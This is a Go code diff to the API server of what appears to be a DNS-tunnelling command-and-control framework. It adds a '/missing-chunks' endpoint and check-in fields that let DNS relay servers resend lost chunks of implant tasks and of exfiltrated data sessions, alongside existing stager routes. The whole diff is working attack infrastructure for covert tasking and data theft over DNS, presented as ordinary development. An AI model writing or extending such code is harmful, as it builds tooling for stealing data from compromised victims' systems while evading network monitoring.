@@ -1096,6 +1096,15 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 		completedExfilSessions = []string{}
 	}
 
+	// Get pending missing chunk requests (tasks/exfils waiting for data)
+	missingChunkRequests, err := api.db.GetPendingMissingChunks(5 * time.Minute)
+	if err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] ⚠️  Failed to get missing chunk requests: %v\n", err)
+		}
+		missingChunkRequests = []MissingChunkRequest{}
+	}
+
 	// Send response with pending caches and domain updates
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]interface{}{
@@ -1104,6 +1113,7 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 		"pending_caches":           cacheTasks,
 		"domain_updates":           pendingDomains,
 		"completed_exfil_sessions": completedExfilSessions,
+		"missing_chunk_requests":   missingChunkRequests,
 		"data": map[string]interface{}{
 			"dns_server_id":    dnsServerID,
 			"timestamp":        time.Now(),
@@ -2891,6 +2901,67 @@ func (api *APIServer) handleStagerProgress(w http.ResponseWriter, r *http.Reques
 	api.sendSuccess(w, "progress recorded", nil)
 }
 
+// MissingChunksRequest represents chunks being sent by a DNS server to fill gaps
+type MissingChunksRequest struct {
+	DNSServerID string            `json:"dns_server_id"`
+	APIKey      string            `json:"api_key"`
+	ID          string            `json:"id"`           // task_id or session_id
+	Type        string            `json:"type"`         // "task" or "exfil"
+	Chunks      map[string]string `json:"chunks"`       // chunk_index -> base64 data
+}
+
+// handleMissingChunks receives missing chunks from DNS servers
+func (api *APIServer) handleMissingChunks(w http.ResponseWriter, r *http.Request) {
+	var req MissingChunksRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	if len(req.Chunks) == 0 {
+		api.sendSuccess(w, "no chunks to process", nil)
+		return
+	}
+
+	// Decode chunks from base64
+	chunks := make(map[int][]byte)
+	for idxStr, b64Data := range req.Chunks {
+		idx := 0
+		fmt.Sscanf(idxStr, "%d", &idx)
+		data, err := base64.StdEncoding.DecodeString(b64Data)
+		if err != nil {
+			fmt.Printf("[API] Warning: Failed to decode chunk %s: %v\n", idxStr, err)
+			continue
+		}
+		chunks[idx] = data
+	}
+
+	if req.Type == "task" {
+		if err := api.db.ReceiveMissingChunks(req.ID, chunks, dnsServerID); err != nil {
+			fmt.Printf("[API] Error receiving missing chunks for task %s: %v\n", req.ID, err)
+			api.sendError(w, http.StatusInternalServerError, "failed to process chunks")
+			return
+		}
+		fmt.Printf("[API] ✓ Received %d missing chunks for task %s from DNS %s\n", len(chunks), req.ID, dnsServerID)
+	} else if req.Type == "exfil" {
+		if err := api.db.ReceiveMissingExfilChunks(req.ID, chunks, dnsServerID); err != nil {
+			fmt.Printf("[API] Error receiving missing exfil chunks for session %s: %v\n", req.ID, err)
+			api.sendError(w, http.StatusInternalServerError, "failed to process exfil chunks")
+			return
+		}
+		fmt.Printf("[API] ✓ Received %d missing exfil chunks for session %s from DNS %s\n", len(chunks), req.ID, dnsServerID)
+	}
+
+	api.sendSuccess(w, "chunks received", map[string]interface{}{
+		"received": len(chunks),
+	})
+}
+
 // panicRecoveryMiddleware catches panics and prevents server crashes
 func (api *APIServer) panicRecoveryMiddleware(next http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
@@ -3022,6 +3093,9 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	dnsRouter.HandleFunc("/stager/chunk", api.handleStagerChunk).Methods("POST")
 	dnsRouter.HandleFunc("/stager/contact", api.handleStagerContact).Methods("POST")
 	dnsRouter.HandleFunc("/stager/progress", api.handleStagerProgress).Methods("POST")
+
+	// Missing chunk recovery endpoint
+	dnsRouter.HandleFunc("/missing-chunks", api.handleMissingChunks).Methods("POST")
 
 	// Health check endpoint (no auth)
 	router.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
